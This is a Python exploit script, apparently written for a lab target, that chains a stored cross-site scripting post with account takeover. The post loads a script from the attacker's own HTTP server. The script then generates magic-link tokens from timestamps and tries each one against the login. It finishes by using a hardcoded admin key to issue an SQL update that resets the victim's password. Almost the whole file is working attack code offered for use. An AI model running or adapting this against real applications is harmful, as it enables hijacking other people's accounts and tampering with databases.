#!/usr/bin/python3

# Exploit Title: XSS + Magic Link bypass + password reset
# Date: 2021-09-17
# Exploit Author: Youssef B
# Tested against: Lab

import requests, argparse, os.path, subprocess, time, ssl, mimetypes
from socketserver import ThreadingMixIn
from http.server import BaseHTTPRequestHandler, HTTPServer

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', help='[PASSWORD RESET] User to deceive', required=True)
parser.add_argument('-uid', '--userid', help='[PASSWORD RESET] User ID of the targeted user', required=True)
parser.add_argument('-f', '--jfile', help='[PASSWORD RESET] Specify the java program for tokens file building', required=True)
parser.add_argument('-p', '--pfile', help='[PASSWORD RESET] Specify the java program for password modification', required=True)
parser.add_argument('-pt', '--port', help='[QUESTION - XSS] Port where your webserver will listen on', required=True)
parser.add_argument('-pl', '--payload', help='[QUESTION - XSS] Payload to send', required=True)
parser.add_argument('-t', '--target', help='Specify a valid target url', required=True)
parser.add_argument('-x', '--proxy', help='Enter your BURP proxy address and port', required=False)
parser.add_argument('-i', '--ip', help='Your IP address', required=True)

args = parser.parse_args()

target = args.target
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

if args.proxy:
    proxies = {'http':args.proxy,'https':args.proxy}


class Http(BaseHTTPRequestHandler):
    def do_GET(self):
        file = args.payload
            
        f = open(os.path.join('.', 'xss', file))

        mimetype, _ = mimetypes.guess_type(file)
        self.send_header('Content-type', mimetype)
        self.send_response(200)
        self.end_headers()
        for s in f:
            self.wfile.write(b's')            

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass


def hsession():
    s = requests.Session()
    return s

s = hsession()

def question(ip, port, payload):
    data = f'title=XSS&description=<strong><script src="http://{ip}:{port}/{payload}"></script></strong>&category=1'

    res = s.post(target + '/question', headers=headers, data=data, verify=False)

    return res.text

def httpd(port):    
    webServer = ThreadingSimpleServer(('', port), Http)

    # webServer.socket = ssl.wrap_socket(webServer.socket, keyfile='./privkey.pem',certfile='./certificate.pem', server_side=True)
    print(f"Server started. Listening at {port}. Press CTRL+C to stop the server once payload requested")

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print(f"Server stopped.\n")

def genmagic(t):
    smillisec = int(time.time() * 1000)

    data = 'username=' + args.user
    target = t + '/generateMagicLink'

    try:
        s.post(target, headers=headers, data=data, allow_redirects=True, verify=False)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something went wrong!!!",err)
        exit(1)
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
        exit(1)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
        exit(1)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
        exit(1)
    
    emillisec = int(time.time() * 1000)
    print("Calculating timestamps...")
    return smillisec, emillisec

def createfile(cmd):
    with open('tokens.txt', 'a+') as f:
        subprocess.call(cmd.split(), stdout=f, stderr=subprocess.DEVNULL)
        print(f"Successfully wrote file: " + f.name)
        return os.path.basename(f.name)

def javaexec(java_file):
    sdate, edate = genmagic(target)

    print("Building tokens file. Please wait...")

    java_file = args.jfile
    java_class = os.path.splitext(java_file)[0]
    cmd = 'java %s %s %s %s' % (java_class, sdate, edate, args.userid)

    if os.path.exists("tokens.txt"):
        print("Removing existing tokens.txt file")
        os.remove("tokens.txt")
        return createfile(cmd)
    else:
        return createfile(cmd)

def dbinsert(hash):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://answers/admin/query'
    }

    data = f'adminKey=0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b&query=update+users+set+password+=+$${hash}$$+where+id+={args.userid}'

    s.post(target + '/admin/query', headers=headers, data=data, verify=False)

def changepass():
    try:
        passwd      = "taipan"
        java_file   = args.pfile
        java_class  = os.path.splitext(java_file)[0]
        cmd         = 'java %s' % (java_class)
        
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

        hash = proc.stdout.read().decode().rstrip('\n')
        print(f"Calculated hash: " + hash)
        dbinsert(hash)
        
        return passwd

    except subprocess.CalledProcessError as exec:
        print("Status : FAIL", exec.returncode, exec.cmd)

def pwner(t):    
    tokens = javaexec(args.pfile)

    print("Starting token spray. Please stand by...")

    with open(tokens, "r") as f:
        for word in f:
            if args.proxy:
                r = s.get(url=t + "/magicLink/" + word.rstrip(), proxies=proxies)
            else:
                r = s.get(url=t + "/magicLink/" + word.rstrip())

            res = r.text

            if "Welcome " + args.user in res:
                print(f"\n***************************************")
                print(s.cookies.get_dict())
                print("***************************************")
                print(f"Successful logged in with token: " + word)
                print("Hey dude! That spray smells good!")
                print(f"\n***************************************")
                print(f"Modifying password for user: " + args.user)
                passwd = changepass()
                if passwd:
                    print(f"You can connect as " + args.user + " with passord: " + passwd + "\n")
                break


if __name__ == '__main__':
    res = question(args.ip, args.port, args.payload)
    if "Question submitted!" in res:
        print(f"Question submitted ")
        httpd(int(args.port))
        pwner(target)
    else:
        print("There is a problem with your question...")
